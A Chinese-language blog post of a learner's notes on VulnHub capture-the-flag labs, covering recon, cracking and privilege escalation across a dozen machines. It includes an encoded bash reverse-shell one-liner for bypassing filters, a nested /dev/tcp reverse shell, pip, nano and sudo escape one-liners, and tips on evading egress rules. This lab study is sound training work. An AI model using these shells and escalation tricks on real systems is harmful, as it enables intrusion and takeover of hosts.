<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>vulnhub_learning</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等


THE PLANETS: EARTHVulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)

这个靶机不同于之前只扫描http协议，需要连httpx一起扫描

其中需要进行异或加密解密

RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：
bash -c &amp;#39;&amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;#39;

这里查询.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">vulnhub_learning</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#THE-PLANETS-EARTH"><span class="toc-text">THE PLANETS: EARTH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JANGOW"><span class="toc-text">JANGOW</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#red"><span class="toc-text">red</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#napping-1-0-1-ova"><span class="toc-text">napping-1.0.1.ova.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EMPIRE-BREAKOUT"><span class="toc-text">EMPIRE: BREAKOUT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnhub-Empire-LupinOne"><span class="toc-text">Vulnhub-Empire: LupinOne</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#thale"><span class="toc-text">thale</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ICA1"><span class="toc-text">ICA1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#noob%EF%BC%9A"><span class="toc-text">noob：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DRIPPING-BLUES-1"><span class="toc-text">DRIPPING BLUES: 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#doubletrouble"><span class="toc-text">doubletrouble</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#darkhole2"><span class="toc-text">darkhole2 *</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BEELZEBUB-1"><span class="toc-text">BEELZEBUB: 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hackable-III"><span class="toc-text">hackable III</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hackkid"><span class="toc-text">hackkid *</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/vulnhub"><i class="tag post-item-tag">vulnhub</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">vulnhub_learning</h1><time class="has-text-grey" datetime="2023-08-12T03:34:50.000Z">2023-08-12</time><article class="mt-2 post-content"><p>记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等</p>
<span id="more"></span>

<h1 id="THE-PLANETS-EARTH"><a href="#THE-PLANETS-EARTH" class="headerlink" title="THE PLANETS: EARTH"></a>THE PLANETS: EARTH</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15638010.html">Vulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)</a></p>
<ul>
<li><p>这个靶机不同于之前只扫描http协议，需要连httpx一起扫描</p>
</li>
<li><p>其中需要进行异或加密解密</p>
</li>
<li><p>RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：</p>
<pre><code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;
</code></pre>
<p>这里查询了一下这个逗号：</p>
</li>
</ul>
<pre><code class="GPT">echo 后面直接跟着逗号 ,，这实际上是一种不常见但合法的写法，被称为 Brace Expansion（花括号扩展）。

在 Bash 中，花括号 &#123;&#125; 可以用于创建一组字符串的扩展，其中逗号分隔每个字符串。这种写法在很多情况下可以用来生成一系列的值。
这里的 echo 和 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ== 是一对值，逗号分隔了这两个值。在这个上下文中，它的目的似乎是将一个值（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ==）传递给 echo 命令。

在子命令中，逗号 , 用于分隔多个子命令，以便按顺序执行它们。
</code></pre>
<ul>
<li><p>靶机中提权时发现缺少二进制文件reset_root的触发器，需要进行调试查看，创建触发器</p>
</li>
<li><p>提权部分看到了两种调试工具：</p>
<ul>
<li><p>strings：<code>strings</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，它用于从二进制文件中提取可打印的字符串。当您需要检查一个二进制文件（如可执行文件、库文件等）中是否包含文本信息，或者需要分析文件中的字符串时，可以使用 <code>strings</code> 命令。</p>
<p>以下是一些常用的 <code>strings</code> 命令选项：</p>
<ul>
<li><code>-n length</code>：指定最小字符串长度。默认情况下，<code>strings</code> 提取长度至少为 4 个字符的字符串。</li>
<li><code>-a</code>：显示所有的字符串，而不仅仅是可打印字符的字符串。</li>
<li><code>-o</code>：将结果以字符串的偏移量（在文件中的位置）形式输出。</li>
<li><code>-t format</code>：指定输出的字符串格式，可以是 d (十进制)、o (八进制)、x (十六进制)。</li>
<li><code>-e encoding</code>：指定输入文件的字符编码。</li>
<li><code>-h</code>：显示命令的帮助信息。</li>
</ul>
</li>
<li><p>strace： <code>strace</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，用于跟踪和记录应用程序执行期间的系统调用和信号。通过使用 <code>strace</code>，您可以查看一个程序与操作系统之间的交互，以及它执行过程中发生的系统调用、信号和其他相关信息。这对于诊断问题、分析性能瓶颈以及理解程序的行为非常有用。</p>
<p>以下是一些常用的 <code>strace</code> 命令选项：</p>
<ul>
<li><code>-o file</code>：将跟踪信息输出到指定文件中，而不是输出到终端。</li>
<li><code>-e trace</code>：指定要跟踪的系统调用。例如，<code>-e open,read</code> 只会跟踪 <code>open</code> 和 <code>read</code> 系统调用。</li>
<li><code>-p pid</code>：跟踪一个已经运行的进程，而不是启动一个新的命令。</li>
<li><code>-f</code>：同时跟踪子进程。对于多进程应用程序，这可以捕获整个进程树的系统调用。</li>
<li><code>-s size</code>：限制输出的字符串长度，避免输出过长。</li>
<li><code>-c</code>：统计系统调用和出错情况的统计信息。</li>
<li><code>-h</code>：显示命令的帮助信息。</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>strace -o output.txt ls -l</p>
<p>这个命令将会跟踪 <code>ls -l</code> 命令的执行过程，并将跟踪信息输出到名为 <code>output.txt</code> 的文件中。</p>
</blockquote>
<h1 id="JANGOW"><a href="#JANGOW" class="headerlink" title="JANGOW"></a>JANGOW</h1><ul>
<li>有时候防火墙禁用nc -e 操作需要我们使用管道文件或者上传nc文件反弹shell，然后可以通过pty等一句话提权为交互式shell</li>
<li>其实一般的服务器做端口限制都不会限制80和443，可以把433作为反弹的端口，也可以用脚本简单探测一下：</li>
<li><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131125722.png" alt="image"></li>
</ul>
<pre><code>for i in &#123;1..65535&#125;;do timeout 1 nc -vz 192.168.11.128 $i &amp;&amp; echo &quot;$i open&quot;&gt;&gt; out.txt || echo &quot;si closed&quot; &gt;&gt; out.txt;done
</code></pre>
<p>脚本的工作原理如下：</p>
<ol>
<li>使用 <code>for</code> 循环迭代端口范围从 1 到 65535。</li>
<li>对每个端口，使用 <code>timeout</code> 命令在 1 秒内尝试使用 <code>nc</code> 命令连接到指定的 IP 地址和端口。</li>
<li>如果连接成功，将输出 “$i open” 到 <code>out.txt</code> 文件。</li>
<li>如果连接失败（超时或连接被拒绝），将输出 “si closed” 到 <code>out.txt</code> 文件。</li>
<li><code>nc -vz</code> 是 <code>nc</code>（netcat）命令的一种使用方式，用于进行基本的网络连接测试和端口扫描。下面是对 <code>-vz</code> 参数的解释：<ul>
<li><code>-v</code>: 这个选项表示 “verbose”，即详细输出模式。当您使用 <code>-v</code> 参数时，<code>nc</code> 命令会显示更多关于连接和操作的详细信息，包括成功连接时的信息。</li>
<li><code>-z</code>: 这个选项表示 “zero-I&#x2F;O mode”，即零 I&#x2F;O 模式。在此模式下，<code>nc</code> 命令只会尝试建立连接，而不会进行实际的数据传输。这在执行端口扫描时很有用，因为它不会向目标发送任何实际的数据。</li>
</ul>
</li>
</ol>
<p>这里在博客<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15642784.html">Vulnhub 靶场 JANGOW: 1.0.1 - sainet - 博客园 (cnblogs.com)</a>中还提到一个端口绑定：</p>
<pre><code>sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
</code></pre>
<blockquote>
<ul>
<li><code>iptables</code>: Linux 上的防火墙管理工具。</li>
<li><code>-A PREROUTING</code>: 添加规则到 PREROUTING 链，这是网络数据包进入路由处理之前的链。</li>
<li><code>-t nat</code>: 指定操作的表类型为 “nat”，用于网络地址转换。</li>
<li><code>-p tcp</code>: 指定匹配 TCP 协议的数据包。</li>
<li><code>--dport 1:65535</code>: 匹配目标端口范围从 1 到 65535。</li>
<li><code>-j REDIRECT --to-port 1234</code>: 如果匹配，将数据包重定向到本地的 1234 端口。</li>
</ul>
</blockquote>
<h1 id="red"><a href="#red" class="headerlink" title="red"></a>red</h1><p>这是目前位置做到最好的靶机</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16783668.html">upfine的博客 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dgs1mple/p/16035221.html#">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p>
<ul>
<li><p>在web部分扫描到后文文件后打开是空白，此时需要再爆破一个参数进行传值</p>
</li>
<li><p>使用hashcat对密码行规则转换</p>
</li>
<li><p>提权部分切换用户打开shell：</p>
<p>sudo -u ippsec &#x2F;usr&#x2F;bin&#x2F;time &#x2F;bin&#x2F;bash</p>
</li>
<li><p>在拿到shell后，</p>
<ul>
<li>一个是查找用户有权限的文件</li>
</ul>
<p>find &#x2F; -group ippsec -type d 2&gt;&#x2F;dev&#x2F;null | grep -v proc.</p>
<p>（他这里其实是查找的的目录-type d 而不是文件 -type f）</p>
<ul>
<li>另一个博主是上传<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">pspy64s</a>监听系统运行的程序，然后发现了后门文件</li>
</ul>
</li>
</ul>
<p>在日志里发现执行后门代码的记录，命令：vi &#x2F;var&#x2F;log&#x2F;syslog，也查看了定时任务：vim &#x2F;etc&#x2F;crontab</p>
<p>使用命令：crontab -l可以查看执行后门文件的定时任务</p>
<h1 id="napping-1-0-1-ova"><a href="#napping-1-0-1-ova" class="headerlink" title="napping-1.0.1.ova."></a>napping-1.0.1.ova.</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15650122.html">Vulnhub 靶场 NAPPING: 1.0.1 - sainet - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csacs/article/details/104535225">Reverse Tabnabbing钓鱼_SoulCat.的博客-CSDN博客</a></p>
<p>这个靶机涉及到网络钓鱼，原理和刚学到的XSS差不多，但是Tab好像不需要设置钓鱼表单，在满足漏洞的情况下好像只需要监听端口就能接收到用户表单，这应该涉及到表单的提交和保存方式</p>
<p>提权部分修改py文件时使用的shell是 &#x2F;usr&#x2F;bin&#x2F;bash 而不是 &#x2F;bin&#x2F;shell执行脚本（在py文件中）,询问GPT一般用户也是可以使用&#x2F;bin&#x2F;bash的，但是这里可能是设置了权限，以后插入py文件应该要先测试相关情况。</p>
<p>vim提权时使用<code>！</code>可以执行外部shell命令，以此提权</p>
<h1 id="EMPIRE-BREAKOUT"><a href="#EMPIRE-BREAKOUT" class="headerlink" title="EMPIRE: BREAKOUT"></a>EMPIRE: BREAKOUT</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15682132.html#3-10000-%E7%AB%AF%E5%8F%A3">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园 (cnblogs.com)</a></p>
<p>在web部分需要使用enum4linux工具检测服务器上的smb用户结合找到的密码登录后台，smbmap更适合当作客户端登录</p>
<p>提权部分需要寻找一些可用文件，一般来说对于网站可以寻找一些配置文件<code>*.conf</code> <code>*.config</code>等文件，对于本地提权则可以寻找一些隐藏文件、有权限的文件、密码文件等</p>
<p>这里白给了一个tar命令，使用getcap查看发现read&#x3D;ep，可以通过加解压对一些文件越权访问，命令：</p>
<p><code>./tar -cvf pass.tar /var/backups/.old_pass.bak</code></p>
<ul>
<li><code>-c</code>: 表示创建一个新的归档文件。</li>
<li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li>
<li><code>-f</code>: 后面紧跟着要创建的归档文件的名称。</li>
</ul>
<p><code>./tar -xvf pass.tar </code></p>
<ul>
<li><code>-x</code>: 表示从归档文件中提取（解压缩）文件。</li>
<li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li>
<li><code>-f</code>: 后面紧跟着要提取的归档文件的名称。</li>
</ul>
<h1 id="Vulnhub-Empire-LupinOne"><a href="#Vulnhub-Empire-LupinOne" class="headerlink" title="Vulnhub-Empire: LupinOne"></a>Vulnhub-Empire: LupinOne</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/C0ngvv/p/15607026.html">Vulnhub-Empire: LupinOne题解 - C0ngvv - 博客园 (cnblogs.com)</a></p>
<p>这里挺有意思的，在爬虫文件中找到了一个：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191102804.png" alt="img"></p>
<p>在而后的扫描中使用<code>~FUZZ</code>查找文件，这实际算得上一个提示hh。</p>
<p>在ssh密钥登录时，使用ssh -i 指定ssh_key</p>
<p>这里遇到一个Enter passphrase for key</p>
<blockquote>
<p>GPT:<br>在 SSH 连接时，”passphrase” 是指用于保护 SSH 私钥的密码。私钥是 SSH 密钥对中的一部分，用于对连接进行身份验证和加密通信。私钥需要受到保护，以防止未经授权的访问。</p>
<p>通常情况下，SSH 密钥对由两部分组成：公钥和私钥。公钥存储在远程服务器上，而私钥存储在本地机器上。当您尝试进行 SSH 连接时，您的私钥将用于身份验证。</p>
<p>如果您的私钥设置了 passphrase（也称为密码短语），则在每次使用私钥进行身份验证时，您都需要输入这个 passphrase。这增加了私钥的安全性，因为即使其他人获得了您的私钥文件，他们也无法在没有知道 passphrase 的情况下使用它。</p>
</blockquote>
<p>在提权时给的特权命令制定了非root用户，只能横向移动：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103261.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103373.png" alt="img"></p>
<p>最后提权部分用到pip，文件给的提权代码：</p>
<pre><code>TF=$(mktemp -d)
echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.py
pip install $TF
</code></pre>
<p>核心部分还有点疑惑，留个引子</p>
<h1 id="thale"><a href="#thale" class="headerlink" title="thale"></a>thale</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15655638.html">Vulnhub 靶场 THALES: 1 - sainet - 博客园 (cnblogs.com)</a></p>
<p>这个靶机只能说中规中矩吧，web部分用到了msf 和msfveno，感觉很少用到msfveno但确实挺好用的</p>
<p>提权部分几个博客园的博主讲得都不算很好，尤其是用backup.sh反弹root shell 时为什么等一会就能连接上，我查看了crontab和ps aux ，没有root是看不到定时任务，只有在ps进程中看到了备份脚本在被root执行：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181112204.png" alt="image-20230818111232141"></p>
<p>root:</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181113859.png" alt="image-20230818111307806"></p>
<p>这里看到脚本5min执行一次</p>
<p>我们根据脚本指引来到保存备份文件的地方，发现上一次备份在5分钟前：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181116917.png" alt="image-20230818111611873"></p>
<p>（其实这里是写文章的时候刚好过了五分钟被截到），一般而言是可以看到上一次备份在几分钟前从而确证它可以自动执行备份。</p>
<p>最后有提个挺有意思的是，横向移动的时候发现su提示需要一个终端，而使用pty提权后就可以移动了</p>
<p>大概查了一下：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15783539.html">Linux 反向 shell 升级为完全可用的 TTY shell - sainet - 博客园 (cnblogs.com)</a></p>
<p>推测nc得到的shell比较受限，查询了一下TTY：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181124899.png" alt="image-20230818112416855"></p>
<p>这里看到一直用的一句话提权实际上是伪终端（那就是说伪终端也算终端咯？）</p>
<h1 id="ICA1"><a href="#ICA1" class="headerlink" title="ICA1"></a>ICA1</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ROSEBUD7_K/article/details/126163403">vulnhub-ica1-通关流程 &#x2F;&#x2F; Kali &amp; 靶场 &amp; 渗透 &amp; Linux_KHDXS7的博客-CSDN博客</a></p>
<p>挺有意思的一个靶机，先后用了不同的php脚本才反弹了一个可用的shell虽然还是很难用。。</p>
<p>在web部分dirb先扫到了一个upload目录，在里面有一个users和attachment目录，估计有文件上传漏洞，然后在配置文件中找到了mysql账户密码，登录之后在数据库中分别找到了管理员的邮箱和phpass加密的密码，以及一些用户名表和base64加密的密码表。</p>
<blockquote>
<p><code>phpass</code> 以密码哈希算法的方式实现了这一点，同时还提供了一些附加的安全性功能，如防止彩虹表攻击、重放攻击等。</p>
<p>主要功能和设计原则包括：</p>
<ol>
<li><strong>强密码哈希</strong>：<code>phpass</code> 使用哈希算法对密码进行多轮迭代，从而增加破解难度。</li>
<li><strong>盐值（Salt）</strong>：<code>phpass</code> 使用随机生成的盐值来增加密码哈希的随机性，以及对相同密码的不同哈希值。这有助于防止彩虹表攻击。</li>
<li><strong>迭代计算</strong>：<code>phpass</code> 通过多次迭代哈希算法，增加破解密码的成本，从而提高密码的安全性。</li>
<li><strong>密码更新</strong>：<code>phpass</code> 支持密码更新，同时保留旧密码的哈希值，以便在用户登录时验证旧密码。</li>
<li><strong>防护</strong>：<code>phpass</code> 试图防止不同类型的攻击，如嗅探攻击、重放攻击等。</li>
<li><code>$P$</code> 是 <code>phpass</code> 中的一个标识符</li>
</ol>
</blockquote>
<p>此时有了两种进攻方式，一个是破解管理员的账户密码，从网页登录管理员后台寻找漏洞，一个是用hydra使用这两个表进行ssh爆破，实际两种都是可行的。</p>
<p>这里破解管理员密码实际上是使用<code> mkpasswd</code> 创建一个密码替换了原来的密码，正好是Mysql管理员可以执行这个操作，也算是提供了一个思路，那么其实另外一个用户密码表应该也能这么做。</p>
<p>在管理员后台一个是可以创建用户上传头像，另一个是可以创建工程添加附件，这正好对应了之前upload里猜测的有文件上传漏洞。</p>
<p>提权部分使用string检查特权文件，发现它在suid下执行cat，使用命令劫持提权成功</p>
<h1 id="noob："><a href="#noob：" class="headerlink" title="noob："></a>noob：</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
<p>这个靶机挺无语的，web部分拿到了一个信息隐写的压缩文件，然后使用<code>steghide</code>进行拆解:</p>
<p><code>info &lt;filename&gt;</code>:显示文件信息</p>
<p><code>extract -sf &lt;filename&gt;</code>:拆解文件（需要密码短语，可能为空）</p>
<p>后面的提权就是找找找，很难想象有一台明文保存其他用户账号密码的用户配置……找了很多东西发现不如遍历本地用户目录</p>
<p>最后的nano提权文件给出的wp：</p>
<pre><code>reset; sh 1&gt;&amp;0 2&gt;&amp;0
</code></pre>
<blockquote>
<ul>
<li><code>reset</code>: 这是一个命令，通常用于重置终端显示，清除屏幕上的内容，使终端重新初始化。</li>
<li><code>sh</code>: 这是一个启动 Shell（命令行解释器）的命令。在这里，它被用于启动一个新的 Shell 进程。</li>
<li><code>1&gt;&amp;0</code> 和 <code>2&gt;&amp;0</code>：这些是重定向操作符。<code>1&gt;&amp;0</code> 表示将标准输出（文件描述符 1）重定向到标准输入（文件描述符 0），<code>2&gt;&amp;0</code> 表示将标准错误（文件描述符 2）重定向到标准输入（文件描述符 0）。</li>
</ul>
</blockquote>
<p>没有很理解，可能是重启一个终端sh然后把所有信息都重定向到当前nano的输入以便于显示？因为不执行reset整个shell就死机了，不重定向看不到回显</p>
<h1 id="DRIPPING-BLUES-1"><a href="#DRIPPING-BLUES-1" class="headerlink" title="DRIPPING BLUES: 1"></a>DRIPPING BLUES: 1</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/327947.html">【Vulnhub 靶场】DRIPPING BLUES: 1 - FreeBuf网络安全行业门户</a></p>
<p>这个靶机需要破解加密的zip文件：</p>
<p><code>fcrackzip </code></p>
<pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip
</code></pre>
<p>这里提到ftp穷举爆破可以使用MSF：ftp_login模块</p>
<p>在robots中发现一个&#x2F;etc。。。推断有文件包含漏洞。</p>
<p>第二次遇到使用Polkit提权：</p>
<blockquote>
<p>基本目前除了最新版的Polkit修复了该漏洞，其他版本都可以提权，可利用版本的范围极大。（<a target="_blank" rel="noopener" href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py%EF%BC%89">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py）</a></p>
</blockquote>
<p>这里该博主拿到shell后的环境检测也挺细致的</p>
<h1 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15673203.html">Vulnhub 靶场 DOUBLETROUBLE: 1 - sainet - 博客园 (cnblogs.com)</a></p>
<p>这里再次用到了图片隐写：stegseek</p>
<p>爆破：stegseek -crack *.png rockyou.txt -xf output</p>
<p>上一次拆解隐藏信息的文件使用的是steghide,查询了一下大致seek用于检测，hide大多是用于隐写，当然提取也可以。</p>
<p>在第二次提权部分我确实不知道怎么快速辨别这个靶机存在dirtucow漏洞，可能遇到比较老的版本都可以拿去对比一下吧</p>
<h1 id="darkhole2"><a href="#darkhole2" class="headerlink" title="darkhole2 *"></a>darkhole2 *</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44862511/article/details/132259658">VulnHub-DarkHole_2靶机实战(超详细保姆级教程)_徐长卿学网安的博客-CSDN博客</a></p>
<p>这个靶机在网页上布置了.git，通过工具<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>、<a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper">git-dumper</a>下载整个仓库分析</p>
<p>git log</p>
<p>git diff XXXX</p>
<p>提权部分涉及到ssh -l的一个映射，搞了半天终于明白了：</p>
<blockquote>
<p>ssh <a href="mailto:&#106;&#x65;&#x68;&#x61;&#x64;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x39;&#x31;&#46;&#x31;&#x34;&#50;">&#106;&#x65;&#x68;&#x61;&#x64;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x39;&#x31;&#46;&#x31;&#x34;&#50;</a> -L </p>
<p>9999:192.168.91.144:9999</p>
<p>这将在本地计算机上创建一个 SSH 隧道，将本地计算机上的 9999 端口的数据转发到远程主机 <code>192.168.91.142</code>，然后由远程主机将数据再次转发到远程主机 <code>192.168.91.144</code> 的 9999 端口。</p>
<p>其中</p>
<p>-L [bind_address:]port:forward-host:forward-port</p>
<ul>
<li><code>bind_address</code>：这是一个可选部分，表示绑定的本地地址。通常可以省略，使得 SSH 监听所有可用的网络接口。</li>
<li><code>port</code>：这是本地计算机上监听的端口。</li>
<li><code>forward-host</code>：这是远程主机的地址。</li>
<li><code>forward-port</code>：这是远程主机上的端口。</li>
</ul>
</blockquote>
<p>实际上是把本地某端口的数据交由ssh连接的主机再转发，相当于代理的感觉</p>
<p>在反弹shell的时候发现bash -i不能反弹，具体原因不是很清楚，但是嵌套**<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.91.140/9001 0&gt;&amp;1&#39;</code>**成功反弹，查询后发现：</p>
<blockquote>
<p>嵌套 shell 的原因有以下几点：</p>
<ol>
<li><strong>维持稳定性</strong>：嵌套 shell 可以在连接中保持稳定，即使连接的初始 shell 会话（例如通过 <code>nc</code> 或 <code>bash</code> 创建的连接）被关闭或中断，嵌套 shell 可以继续运行，确保攻击者能够继续执行操作。</li>
<li><strong>隐藏连接</strong>：嵌套 shell 可以隐藏连接细节，使连接更加隐蔽。通过将初始连接与嵌套 shell 连接分开，可以减少检测和防御系统发现连接的风险。</li>
<li><strong>适应性</strong>：嵌套 shell 可以在不同的环境和情况下更灵活地使用。例如，通过在嵌套 shell 中执行各种命令，攻击者可以根据需要进行操作。</li>
<li><strong>错误处理</strong>：嵌套 shell 可以处理连接中的错误情况，确保连接中断或其他问题不会导致整个攻击操作失败。</li>
</ol>
</blockquote>
<p>如果单层的反弹不行，可以试一下嵌套</p>
<p>另外发现：crontab只能查看当前用户的定时任务，直接读取&#x2F;etc&#x2F;crontab可以查看本机上的定时任务</p>
<p>ss命令：</p>
<p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p>
<p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p>
<p>以下是一些常用的 <code>ss</code> 命令选项和用法示例：</p>
<ol>
<li><p><strong>显示所有网络连接</strong>：</p>
<pre><code class="bash">ss -tuln
</code></pre>
<p>这会显示所有 TCP（-t）和 UDP（-u）连接的监听端口（-l）信息，以数字格式显示（-n）。</p>
</li>
<li><p><strong>显示指定端口的监听情况</strong>：</p>
<pre><code class="bash">ss -tuln | grep 80
</code></pre>
<p>这会过滤并显示所有监听端口为 80 的连接。</p>
</li>
<li><p><strong>显示套接字统计信息</strong>：</p>
<pre><code class="bash">ss -s
</code></pre>
<p>这会显示套接字统计信息，包括打开的套接字数量、连接状态等。</p>
</li>
<li><p><strong>显示 TCP 套接字信息</strong>：</p>
<pre><code class="bash">ss -t
</code></pre>
<p>这会显示所有 TCP 套接字的详细信息。</p>
</li>
<li><p><strong>显示 UDP 套接字信息</strong>：</p>
<pre><code class="bash">ss -u
</code></pre>
<p>这会显示所有 UDP 套接字的详细信息。</p>
</li>
<li><p><strong>显示 Unix 套接字信息</strong>：</p>
<pre><code class="bash">ss -x
</code></pre>
<p>这会显示所有 Unix 套接字（本地套接字）的详细信息。</p>
</li>
<li><p><strong>显示特定用户的套接字信息</strong>：</p>
<pre><code class="bash">ss -tuln | grep username
</code></pre>
<p>这会过滤并显示与特定用户名相关的连接信息。</p>
</li>
<li><p><strong>显示所有套接字信息（包括监听和连接）</strong>：</p>
<pre><code class="bash">ss -a
</code></pre>
<p>这会显示所有套接字的信息，包括监听和连接状态。</p>
</li>
</ol>
<p>一般可以先-s查看统计信息然后再具体查看相关类型套接字</p>
